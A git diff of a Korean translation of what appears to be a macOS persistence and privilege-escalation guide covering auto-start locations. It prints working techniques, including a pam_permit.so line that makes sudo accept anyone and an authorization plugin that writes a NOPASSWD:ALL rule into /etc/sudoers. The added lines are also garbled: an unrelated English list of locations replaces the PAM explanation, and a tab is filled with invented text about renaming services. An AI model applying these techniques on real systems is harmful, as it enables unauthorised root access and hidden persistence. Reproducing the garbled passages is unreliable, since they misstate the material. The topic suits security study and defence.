-스크립트를 컴파일한 후, 아래 스크립트를 실행하여 Folder Actions를 설정합니다. 이 스크립트는 전역적으로 Folder Actions를 활성화하고 이전에 컴파일한 스크립트를 데스크톱 폴더에 특정하게 첨부합니다.
+스크립트를 컴파일한 후, 아래 스크립트를 실행하여 Folder Actions를 설정합니다. 이 스크립트는 Folder Actions를 전역적으로 활성화하고 이전에 컴파일한 스크립트를 데스크톱 폴더에 특정하게 첨부합니다.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events");
@@ -784,11 +780,11 @@ var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
 se.folderActions.push(fa);
 fa.scripts.push(myScript);
 ```
-다음과 같이 설정 스크립트를 실행하십시오:
+설정 스크립트를 다음과 같이 실행하십시오:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
-* GUI를 통해 이 지속성을 구현하는 방법은 다음과 같습니다:
+* 이것은 GUI를 통해 이 지속성을 구현하는 방법입니다:
 
 다음은 실행될 스크립트입니다:
 
@@ -812,19 +808,19 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
 그런 다음 `Folder Actions Setup` 앱을 열고 **감시하려는 폴더**를 선택하고 경우에 따라 **`folder.scpt`**를 선택합니다(내 경우에는 output2.scp로 이름을 지었습니다):
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
 
 이제 **Finder**로 해당 폴더를 열면 스크립트가 실행됩니다.
 
 이 구성은 **base64 형식의** **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**에 저장되어 있습니다.
 
-이제 GUI 액세스 없이 이 영속성을 준비해 보겠습니다:
+이제 GUI 액세스 없이 이 영속성을 준비해 봅시다:
 
-1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**를 백업하기 위해 `/tmp`로 복사합니다:
+1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**를 `/tmp`로 백업하기:
 * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
 2. 방금 설정한 Folder Actions를 **제거**합니다:
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 이제 비어 있는 환경이 있습니다.
 
@@ -850,7 +846,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.
 
 #### 설명 및 악용
 
-Dock에 나타나는 모든 애플리케이션은 plist 내에서 지정됩니다: **`~/Library/Preferences/com.apple.dock.plist`**
+Dock에 나타나는 모든 애플리케이션은 **`~/Library/Preferences/com.apple.dock.plist`**에 지정됩니다.
 
 **애플리케이션을 추가**하는 것만으로도 가능합니다:
 
@@ -923,7 +919,7 @@ killall Dock
 
 * 샌드박스 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
 * 매우 구체적인 동작이 필요함
-* 다른 샌드박스로 이동
+* 다른 샌드박스에 도달할 것임
 * TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 위치
@@ -936,11 +932,11 @@ killall Dock
 
 #### 설명 및 공격
 
-**코드와 함께 컬러 피커** 번들을 컴파일하고 ([**예를 들어 이것**](https://github.com/viktorstrate/color-picker-plus)을 사용할 수 있음) 생성자를 추가하고 (`macos-auto-start-locations.md#screen-saver`의 스크린 세이버 섹션과 같이) 번들을 `~/Library/ColorPickers`에 복사합니다.
+**코드와 함께 컬러 피커** 번들을 컴파일하십시오 (예: [**이것을 사용할 수 있습니다**](https://github.com/viktorstrate/color-picker-plus)) 그리고 생성자를 추가하십시오 ([스크린 세이버 섹션](macos-auto-start-locations.md#screen-saver)과 같이) 그리고 번들을 `~/Library/ColorPickers`로 복사하십시오.
 
 그럼, 컬러 피커가 트리거되면 당신의 코드도 실행될 것입니다.
 
-당신의 라이브러리를 로드하는 이진 파일이 **매우 제한적인 샌드박스**를 가지고 있음을 유의하세요: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+당신의 라이브러리를 로드하는 이진 파일이 매우 제한적인 샌드박스를 가지고 있음을 유의하십시오: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
@@ -967,9 +963,9 @@ killall Dock
 
 #### 설명 및 Exploit
 
-Finder Sync Extension이 있는 애플리케이션 예시는 [**여기에서 찾을 수 있습니다**](https://github.com/D00MFist/InSync).
+Finder Sync Extension이 포함된 응용 프로그램 예시는 [**여기에서 찾을 수 있습니다**](https://github.com/D00MFist/InSync).
 
-애플리케이션은 `Finder Sync Extensions`를 가질 수 있습니다. 이 확장은 실행될 애플리케이션 내부로 들어갑니다. 더욱이, 확장이 코드를 실행할 수 있도록 하려면 **일부 유효한 Apple 개발자 인증서로 서명**되어야 하며, **샌드박스**에 있어야 합니다 (비록 완화된 예외가 추가될 수 있음) 그리고 다음과 같은 것으로 등록되어야 합니다:
+응용 프로그램은 `Finder Sync Extensions`를 가질 수 있습니다. 이 확장은 실행될 응용 프로그램 내부로 들어갑니다. 또한, 확장이 코드를 실행할 수 있도록 하려면 **일부 유효한 Apple 개발자 인증서로 서명**되어야 하며, **샌드박스**에 있어야 합니다 (비록 완화된 예외가 추가될 수 있음) 그리고 다음과 같은 것으로 등록되어야 합니다:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -979,8 +975,8 @@ pluginkit -e use -i com.example.InSync.InSync
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
 Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
 
-* 샌드박스 우회에 유용함: [🟠](https://emojipedia.org/large-orange-circle)
-* 그러나 일반 애플리케이션 샌드박스에 빠질 수 있음
+* 샌드박스 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
+* 그러나 일반 애플리케이션 샌드박스에 끝나게 될 것입니다
 * TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 위치
@@ -994,11 +990,11 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 * `~/Library/Screen Savers`
 * **트리거**: 스크린 세이버 선택
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### 설명 및 Exploit
 
-Xcode에서 새 프로젝트를 생성하고 새 **스크린 세이버**를 생성하는 템플릿을 선택합니다. 그런 다음, 예를 들어 다음 코드를 사용하여 로그를 생성합니다.
+Xcode에서 새 프로젝트를 만들고 새 **스크린 세이버**를 생성하는 템플릿을 선택합니다. 그런 다음, 예를 들어 다음 코드를 사용하여 로그를 생성합니다.
 
 **빌드**하고 `.saver` 번들을 **`~/Library/Screen Savers`**로 복사합니다. 그런 다음, 스크린 세이버 GUI를 열고 클릭하면 많은 로그가 생성됩니다:
 
@@ -1014,7 +1010,7 @@ Timestamp                       (process)[PID]
 {% endcode %}
 
 {% hint style="danger" %}
-이 코드를 로드하는 이진 파일의 entitlements 내부에 (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`**을 찾을 수 있기 때문에 **일반 애플리케이션 샌드박스 내에** 있게 될 것입니다.
+이 코드를 로드하는 이진 파일의 entitlements 내부에 (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`**을 찾을 수 있기 때문에 **일반 애플리케이션 샌드박스 내부에 있을 것**입니다.
 {% endhint %}
 
 Saver code:
@@ -1088,7 +1084,7 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)
 
 * 샌드박스 우회에 유용함: [🟠](https://emojipedia.org/large-orange-circle)
-* 그러나 응용 프로그램 샌드박스에 끝나게 됨
+* 그러나 애플리케이션 샌드박스에 끝나게 됨
 * TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 * 샌드박스는 매우 제한적으로 보임
 
@@ -1104,18 +1100,18 @@ writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.
 * 루트 권한 필요
 * `Some.app/Contents/Library/Spotlight/`
 * **트리거**: 스포트라이트 플러그인이 관리하는 확장자를 가진 새 파일이 생성됨.
-* 새 앱 필요
+* 새로운 앱 필요
 
 #### 설명 및 악용
 
-Spotlight은 macOS의 내장 검색 기능으로, 사용자에게 **컴퓨터의 데이터에 빠르고 포괄적인 액세스**를 제공하기 위해 설계되었습니다.\
-이 빠른 검색 기능을 용이하게 하기 위해 Spotlight은 **독점 데이터베이스**를 유지하고 대부분의 파일을 구문 분석하여 색인을 생성하여 파일 이름과 내용을 통한 신속한 검색을 가능하게 합니다.
+Spotlight는 macOS의 내장 검색 기능으로, 사용자에게 **컴퓨터의 데이터에 빠르고 포괄적인 액세스**를 제공하기 위해 설계되었습니다.\
+이 빠른 검색 기능을 용이하게 하기 위해 Spotlight는 **독점 데이터베이스**를 유지하고 대부분의 파일을 구문 분석하여 색인을 생성하여 파일 이름과 내용을 통한 신속한 검색을 가능하게 합니다.
 
-Spotlight의 기본 메커니즘은 'mds'라는 중앙 프로세스를 포함하며, 이는 **'메타데이터 서버'**를 나타냅니다. 이 프로세스는 전체 Spotlight 서비스를 조정합니다. 이에 보완적으로, 여러 'mdworker' 데몬이 다양한 유지 관리 작업을 수행하며, 다양한 파일 형식을 색인화합니다 (`ps -ef | grep mdworker`). 이러한 작업은 Spotlight 가져오기 플러그인 또는 **".mdimporter 번들**"을 통해 가능하며, 이를 통해 Spotlight은 다양한 파일 형식의 콘텐츠를 이해하고 색인화할 수 있습니다.
+Spotlight의 기본 메커니즘은 'mds'라는 중앙 프로세스를 포함하며, 이는 **'메타데이터 서버'**를 나타냅니다. 이 프로세스는 Spotlight 서비스 전반을 조정합니다. 이에 보완적으로, 여러 'mdworker' 데몬이 다양한 유지 관리 작업을 수행하며, 다양한 파일 형식을 색인화합니다 (`ps -ef | grep mdworker`). 이러한 작업은 Spotlight 가져오기 플러그인 또는 **".mdimporter 번들**"을 통해 가능하며, 이를 통해 Spotlight는 다양한 파일 형식의 콘텐츠를 이해하고 색인화할 수 있습니다.
 
-플러그인 또는 **`.mdimporter`** 번들은 이전에 언급된 위치에 있으며, 새 번들이 나타나면 분 내에 로드됩니다(서비스를 다시 시작할 필요 없음). 이러한 번들은 관리할 수 있는 **파일 유형 및 확장자를 나타내야**하며, 이렇게 하면 Spotlight은 지정된 확장자를 가진 새 파일이 생성될 때 이를 사용합니다.
+플러그인 또는 **`.mdimporter`** 번들은 이전에 언급된 위치에 있으며, 새 번들이 나타나면 분 내에 로드됩니다(서비스를 다시 시작할 필요 없음). 이러한 번들은 관리할 수 있는 **파일 유형 및 확장자를 나타내야**하며, 이렇게 하면 스포트라이트가 지정된 확장자를 가진 새 파일이 생성될 때 이를 사용합니다.
 
-모든 로드된 `mdimporters`를 찾을 수 있습니다. 실행 중:
+로드된 **모든 `mdimporters`**를 찾을 수 있습니다. 실행 중:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1163,10 +1159,10 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 {% hint style="danger" %}
 만약 다른 `mdimporter`의 Plist를 확인하면 **`UTTypeConformsTo`** 항목을 찾을 수 없을 수 있습니다. 이는 내장 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier))이기 때문에 확장자를 지정할 필요가 없기 때문입니다.
 
-또한, 시스템 기본 플러그인이 항상 우선권을 갖기 때문에, 공격자는 애플의 자체 `mdimporters`에 의해 인덱싱되지 않은 파일에만 액세스할 수 있습니다.
+또한, 시스템 기본 플러그인이 항상 우선권을 갖기 때문에, 공격자는 애플의 자체 `mdimporters`에 의해 색인화되지 않은 파일에만 액세스할 수 있습니다.
 {% endhint %}
 
-자체 `importer`를 만들려면 이 프로젝트를 시작할 수 있습니다: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) 그리고 이름, **`CFBundleDocumentTypes`**를 변경하고 **`UTImportedTypeDeclarations`**를 추가하여 지원하려는 확장자를 지원하도록하고 **`schema.xml`**에서 이를 반영하십시오.\
+자체 Importer를 만들려면 이 프로젝트를 시작할 수 있습니다: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) 그리고 이름, **`CFBundleDocumentTypes`**를 변경하고 **`UTImportedTypeDeclarations`**를 추가하여 지원하려는 확장자를 지원하도록하고 **`schema.xml`**에서 이를 반영하십시오.\
 그런 다음 **`GetMetadataForFile`** 함수의 코드를 **변경**하여 처리된 확장자가 포함된 파일이 생성될 때 페이로드를 실행하도록합니다.
 
 마지막으로 새로운 `.mdimporter`를 빌드하고 복사하여 이전 위치 중 하나에 붙여넣고 **로그를 모니터링**하거나 **`mdimport -L`**을 확인하여 로드될 때마다 확인할 수 있습니다.
@@ -1180,7 +1176,7 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
 
 * 샌드박스 우회에 유용함: [🟠](https://emojipedia.org/large-orange-circle)
-* 특정 사용자 조치가 필요합니다
+* 특정 사용자 조치가 필요함
 * TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 위치
@@ -1196,15 +1192,15 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.
 ## Root Sandbox Bypass
 
 {% hint style="success" %}
-여기에서는 **루트** 권한이 필요하거나 다른 **이상한 조건**이 필요한 **파일에 쓰여진 것을 단순히 실행**할 수 있는 **샌드박스 우회**에 유용한 시작 위치를 찾을 수 있습니다.
+여기에서는 **루트** 권한이 필요하거나 다른 **이상한 조건**이 필요한 **파일에 쓰기만으로 무언가를 실행**할 수 있는 **샌드박스 우회**에 유용한 시작 위치를 찾을 수 있습니다.
 {% endhint %}
 
-### 주기적
+### 주기적인
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
 
 * 샌드박스 우회에 유용함: [🟠](https://emojipedia.org/large-orange-circle)
-* 그러나 루트 권한이 필요합니다
+* 그러나 루트 권한이 필요함
 * TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 위치
@@ -1218,7 +1214,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.
 
 #### 설명 및 악용
 
-주기적 스크립트 (**`/etc/periodic`**)는 `/System/Library/LaunchDaemons/com.apple.periodic*`에 구성된 **런치 데몬** 때문에 실행됩니다. `/etc/periodic/`에 저장된 스크립트는 **파일의 소유자로 실행**되기 때문에 잠재적인 권한 상승에는 작동하지 않습니다.
+주기적 스크립트 (**`/etc/periodic`**)는 `/System/Library/LaunchDaemons/com.apple.periodic*`에 구성된 **런치 데몬** 때문에 실행됩니다. `/etc/periodic/`에 저장된 스크립트는 **파일의 소유자로 실행**되기 때문에 잠재적인 권한 상슨에는 작동하지 않습니다.
 {% code overflow="wrap" %}
 ```bash
 # Launch daemons that will execute the periodic scripts
@@ -1252,17 +1248,17 @@ total 8
 ```
 {% endcode %}
 
-다른 주기적 스크립트들이 실행될 것으로 표시된 것이 **`/etc/defaults/periodic.conf`**에 있습니다:
+다른 주기적인 스크립트들이 실행될 것으로 표시된 것이 **`/etc/defaults/periodic.conf`**에 있습니다:
 ```bash
 grep "Local scripts" /etc/defaults/periodic.conf
 daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-만약 `/etc/daily.local`, `/etc/weekly.local`, 또는 `/etc/monthly.local` 파일 중 하나를 작성한다면 **언젠가 실행될 것**입니다.
+만약 `/etc/daily.local`, `/etc/weekly.local`, 또는 `/etc/monthly.local` 파일 중 하나를 작성한다면 **언젠가 실행**될 것입니다.
 
 {% hint style="warning" %}
-주기적 스크립트는 **스크립트의 소유자로 실행**됩니다. 따라서 일반 사용자가 스크립트를 소유하는 경우 해당 사용자로 실행됩니다 (이는 권한 상슨 공격을 방지할 수 있음).
+주기적 스크립트는 **스크립트의 소유자로 실행**됩니다. 따라서 일반 사용자가 스크립트를 소유하고 있다면 해당 사용자로 실행됩니다 (이는 권한 상승 공격을 방지할 수 있음).
 {% endhint %}
 
 ### PAM
@@ -1278,9 +1274,9 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.
 
 * 항상 루트 권한 필요
 
-#### 설명 및 공격
+#### 설명 및 Exploitation
 
-PAM은 macOS 내에서 쉬운 실행보다는 **지속성**과 악성 코드에 더 중점을 둔다. 이 블로그에서는 이 기술을 더 잘 이해하기 위해 자세한 설명을 제공하지 않습니다. **기술 설명을 이해하려면 해당 기술 설명을 읽으십시오**.
+PAM은 macOS 내에서 쉬운 실행보다는 **지속성**과 악성 코드에 더 중점을 둔다. 이 기술을 더 잘 이해하기 위해 **해당 기술에 대한 설명을 읽어보세요**.
 
 PAM 모듈을 확인하려면:
 ```bash
@@ -1288,17 +1284,43 @@ ls -l /etc/pam.d
 ```
 ## macOS Auto Start Locations
 
-### macOS Auto Start Locations
+### Launch Agents
 
-A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line: 
+#### Global
 
-### macOS 자동 시작 위치
+- `/Library/LaunchAgents/`
+- `/Library/LaunchDaemons/`
 
-PAM을 남용한 지속성/권한 상승 기술은 /etc/pam.d/sudo 모듈을 수정하여 다음 줄을 맨 앞에 추가하는 것만큼 쉽습니다:
+#### Per-User
+
+- `~/Library/LaunchAgents/`
+
+### Login/Logout Items
+
+- System Preferences > Users & Groups > Login Items
+
+### Startup Items
+
+- `/Library/StartupItems/`
+
+### Cron Jobs
+
+- `crontab -l`
+- `/etc/crontab`
+- `/etc/cron.*/*`
+
+### Kernel Extensions
+
+- `/Library/Extensions/`
+- `/System/Library/Extensions/`
+
+### Launch Daemons
+
+- `/System/Library/LaunchDaemons/`
 ```bash
 auth       sufficient     pam_permit.so
 ```
-그렇게 하면 다음과 같이 보일 것입니다:
+그렇게 보일 것입니다.
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1312,7 +1334,7 @@ session    required       pam_permit.so
 그리고 따라서 **`sudo`를 사용하려는 모든 시도가 작동**합니다.
 
 {% hint style="danger" %}
-이 디렉토리는 TCC에 의해 보호되므로 사용자가 액세스를 요청하는 프롬프트를 받을 가능성이 매우 높습니다.
+이 디렉토리는 TCC에 의해 보호되므로 사용자가 액세스 권한을 요청하는 프롬프트를 받을 가능성이 매우 높습니다.
 {% endhint %}
 
 ### 권한 플러그인
@@ -1330,9 +1352,9 @@ Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 * 루트 권한 필요
 * 플러그인을 사용하도록 권한 데이터베이스를 구성해야 함
 
-#### 설명 및 악용
+#### 설명 및 Exploitation
 
-사용자가 로그인할 때 실행되는 권한 플러그인을 생성하여 지속성을 유지할 수 있습니다. 이러한 플러그인 중 하나를 만드는 방법에 대한 자세한 정보는 이전의 writeup을 확인하십시오 (그리고 조심하세요, 잘못 작성된 플러그인은 사용자를 차단하고 복구 모드에서 Mac을 정리해야 할 수 있습니다).
+사용자가 로그인할 때 실행되는 권한 플러그인을 생성하여 지속성을 유지할 수 있습니다. 이러한 플러그인 중 하나를 생성하는 방법에 대한 자세한 정보는 이전의 writeup을 확인하십시오 (그리고 조심하세요, 잘못 작성된 플러그인은 사용자를 잠금 상태로 만들 수 있으며 복구 모드에서 Mac을 정리해야 할 수 있습니다).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1347,7 +1369,7 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**번들**을 로드할 위치로 이동하십시오:
+**번들**을 로드할 위치로 **이동**하십시오:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
@@ -1376,7 +1398,7 @@ security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```bash
 security authorize com.asdf.asdf
 ```
-그런 다음 **스태프 그룹은 sudo 액세스**를 가져야 합니다(`/etc/sudoers`를 읽어 확인).
+그런 다음 **스태프 그룹은 sudo 액세스**를 가져야 합니다 (`/etc/sudoers`를 읽어 확인).
 
 ### Man.conf
 
@@ -1425,7 +1447,7 @@ touch /tmp/manconf
 
 #### 설명 및 Exploit
 
-`/etc/apache2/httpd.conf`에 모듈을 로드하도록 지정할 수 있습니다. 다음과 같은 줄을 추가하면 됩니다:
+`/etc/apache2/httpd.conf`에 모듈을 로드하도록 지정할 수 있습니다. 다음과 같은 줄을 추가하십시오:
 
 {% code overflow="wrap" %}
 ```bash
@@ -1463,11 +1485,11 @@ syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 
 * **`/etc/security/audit_warn`**
 * 루트 권한 필요
-* **트리거**: auditd가 경고를 감지할 때
+* **트리거**: auditd가 경고를 감지했을 때
 
 #### 설명 및 Exploit
 
-auditd가 경고를 감지할 때 스크립트 **`/etc/security/audit_warn`**이 **실행**됩니다. 따라서 여기에 페이로드를 추가할 수 있습니다.
+auditd가 경고를 감지하면 스크립트 **`/etc/security/audit_warn`**이 **실행**됩니다. 따라서 여기에 페이로드를 추가할 수 있습니다.
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
@@ -1480,9 +1502,9 @@ echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 **StartupItem**은 `/Library/StartupItems/` 또는 `/System/Library/StartupItems/` 중 하나에 위치해야 하는 디렉토리입니다. 이 디렉토리가 설정되면 두 가지 특정 파일을 포함해야 합니다:
 
 1. **rc 스크립트**: 시작할 때 실행되는 셸 스크립트입니다.
-2. **plist 파일**, 특히 `StartupParameters.plist`로 명명된 파일로 다양한 구성 설정을 포함합니다.
+2. 여러 구성 설정을 포함하는 **plist 파일**인 `StartupParameters.plist`이어야 합니다.
 
-시작 프로세스가 이들을 인식하고 활용할 수 있도록 rc 스크립트와 `StartupParameters.plist` 파일이 올바른 위치에 있는지 확인하십시오.
+시작 프로세스가 이러한 파일을 인식하고 활용할 수 있도록 시작 항목 디렉토리 내에 rc 스크립트와 `StartupParameters.plist` 파일이 올바르게 배치되어 있는지 확인하십시오.
 
 {% tabs %}
 {% tab title="StartupParameters.plist" %}
@@ -1504,7 +1526,37 @@ echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
 {% endtab %}
 
-{% tab title="superservicename" %}슈퍼서비스이름{% endtab %}
+{% tab title="superservicename" %} 
+
+### 슈퍼 서비스 이름
+
+시스템 부팅 시 자동으로 실행되는 서비스의 이름을 변경하여 해당 서비스를 식별합니다.
+
+#### 위치
+
+```plaintext
+/Library/LaunchDaemons/superservicename.plist
+```
+
+#### 설명
+
+이 위치에는 시스템 부팅 시 자동으로 실행되는 서비스의 구성 파일이 있습니다. 이 파일을 편집하여 서비스의 이름을 변경할 수 있습니다.
+
+#### 영향
+
+서비스의 이름을 변경하면 해당 서비스를 식별하는 데 도움이 될 수 있습니다. 그러나 잘못된 편집은 시스템 부팅에 영향을 줄 수 있으므로 주의해야 합니다.
+
+#### 탐지
+
+시스템 부팅 시 자동으로 실행되는 서비스의 이름을 확인하려면 해당 위치의 파일을 확인하십시오.
+
+#### 방어
+
+이 위치의 파일에 대한 쓰기 권한을 최소한으로 제한하여 불필요한 변경을 방지하고, 서비스의 이름을 변경할 때는 신중히 검토해야 합니다.
+
+``` 
+
+{% endtab %}
 ```bash
 #!/bin/sh
 . /etc/rc.common
@@ -1529,12 +1581,12 @@ RunService "$1"
 ### emond
 
 {% hint style="danger" %}
-나는 내 macOS에서 이 구성 요소를 찾을 수 없습니다. 자세한 정보는 writeup을 확인하십시오.
+나는 macOS에서 이 구성 요소를 찾을 수 없습니다. 자세한 정보는 writeup을 확인하십시오.
 {% endhint %}
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
 
-Apple에 의해 소개된 **emond**는 개발이 미비하거나 아마도 폐기된 것으로 보이지만 여전히 접근 가능합니다. Mac 관리자에게 특별히 유익하지는 않지만, 이 낯선 서비스는 위협 행위자에게 미묘한 지속성 방법으로 작용할 수 있으며, 아마도 대부분의 macOS 관리자들에게는 눈에 띄지 않을 것입니다.
+Apple에 의해 소개된 **emond**는 개발이 미비하거나 아마도 폐기된 것으로 보이지만 여전히 접근 가능합니다. Mac 관리자에게 특별히 유익하지는 않지만, 이 낯선 서비스는 위협 요소들에게 미묘한 지속성 방법으로 작용할 수 있으며, 아마도 대부분의 macOS 관리자들에게는 눈에 띄지 않을 것입니다.
 
 **emond**의 악용을 인식하는 데 익숙한 사람들에게는 간단합니다. 이 서비스의 LaunchDaemon은 실행할 스크립트를 단일 디렉토리에서 찾습니다. 이를 검사하려면 다음 명령을 사용할 수 있습니다:
 ```bash
@@ -1552,12 +1604,12 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.
 
 #### 설명 및 Exploit
 
-XQuartz는 macOS에 **더 이상 설치되지 않습니다**, 자세한 정보가 필요하면 writeup을 확인하십시오.
+XQuartz는 macOS에 **더 이상 설치되지 않으므로**, 자세한 정보가 필요하면 writeup을 확인하십시오.
 
 ### kext
 
 {% hint style="danger" %}
-루트로 심지어 kext를 설치하는 것이 너무 복잡하여 이를 모래 상자를 탈출하거나 영속성을 위해 고려하지 않겠습니다 (exploit이 있는 경우 제외)
+루트로 심지어 kext를 설치하는 것이 너무 복잡하여 이를 모래 상자를 탈출하거나 지속성을 위해 고려하지 않겠습니다 (exploit이 있는 경우 제외)
 {% endhint %}
 
 #### 위치
@@ -1569,7 +1621,7 @@ KEXT를 시작 항목으로 설치하려면 다음 위치 중 하나에 **설치
 * `/Library/Extensions`
 * 제3자 소프트웨어에 의해 설치된 KEXT 파일
 
-현재로드된 kext 파일을 나열할 수 있습니다:
+현재로드된 kext 파일을 다음과 같이 나열할 수 있습니다:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1577,6 +1629,8 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
+[**커널 확장에 대한 자세한 정보는 이 섹션을 확인하십시오**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).
+
 ### ~~amstoold~~
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)
@@ -1588,9 +1642,9 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.
 
 #### 설명 및 Exploitation
 
-`/System/Library/LaunchAgents/com.apple.amstoold.plist`의 `plist`가이 이진 파일을 사용하고 XPC 서비스를 노출하는 동안... 문제는 해당 바이너리가 존재하지 않았기 때문에 거기에 무언가를 놓을 수 있고 XPC 서비스가 호출 될 때 바이너리가 호출됩니다.
+`/System/Library/LaunchAgents/com.apple.amstoold.plist`의 `plist`가이 바이너리를 사용하고 XPC 서비스를 노출했습니다... 문제는 바이너리가 존재하지 않았기 때문에 거기에 무언가를 놓을 수 있고 XPC 서비스가 호출될 때 바이너리가 호출됩니다.
 
-나는 더 이상 내 macOS에서 이것을 찾을 수 없습니다.
+나는 더 이상 내 macOS에서 이것을 찾을 수 없다.
 
 ### ~~xsanctl~~
 
@@ -1604,7 +1658,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.
 
 #### 설명 및 exploit
 
-이 스크립트를 실행하는 것은 매우 흔하지 않은 것으로 보이며, 내 macOS에서 심지어 찾을 수 없었습니다. 자세한 정보가 필요하면 writeup을 확인하십시오.
+이 스크립트를 실행하는 것은 매우 흔하지 않은 것으로 보이며, 내 macOS에서 심지어 찾을 수 없었으므로 자세한 정보가 필요하다면 writeup을 확인하십시오.
 
 ### ~~/etc/rc.common~~
 
@@ -1612,7 +1666,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.
 **현대 MacOS 버전에서 작동하지 않습니다**
 {% endhint %}
 
-여기에 **부팅시 실행될 명령을 배치하는 것도 가능합니다.** 일반적인 rc.common 스크립트의 예시:
+여기에 **부팅시 실행될 명령어를 배치하는 것도 가능합니다.** 일반적인 rc.common 스크립트의 예시:
 ```bash
 #
 # Common setup for startup scripts.
